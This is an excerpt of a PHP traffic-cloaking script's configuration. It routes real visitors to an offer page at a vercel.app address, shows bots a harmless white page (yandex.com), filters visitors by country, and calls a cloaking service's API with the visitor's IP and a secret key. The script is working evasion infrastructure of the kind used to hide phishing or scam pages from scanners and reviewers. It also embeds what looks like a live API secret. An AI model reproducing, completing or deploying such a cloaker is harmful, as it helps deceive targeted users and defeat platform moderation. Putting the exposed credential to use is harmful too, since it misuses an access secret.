...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://paneldirecto.vercel.app/';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://yandex.com/';//PHP/HTML file or URL used for bots
...
$HCSET['FILTER_GEO_LIST'] = 'USA'; // string([2Chars country codes])
...
$HCSET['API_SECRET_KEY'] = 'v1c4d1ba0760f8412096f4b20414fee880';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-1805746681&js=false&stage='.$HCSET['stage'];
